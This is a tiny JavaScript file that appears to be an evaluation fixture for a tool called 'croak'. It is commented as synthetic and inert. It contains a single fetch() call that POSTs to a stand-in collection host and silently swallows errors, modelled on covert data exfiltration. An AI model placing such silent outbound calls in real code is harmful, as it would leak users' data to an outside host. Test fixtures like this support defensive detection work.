// SYNTHETIC croak eval fixture. Inert by design: croak never executes it,
// and the target is a reserved .invalid domain that cannot resolve.
fetch("https://collect.example.invalid/setup", {
  method: "POST",
  body: "croak-eval-synthetic",
}).catch(() => {});
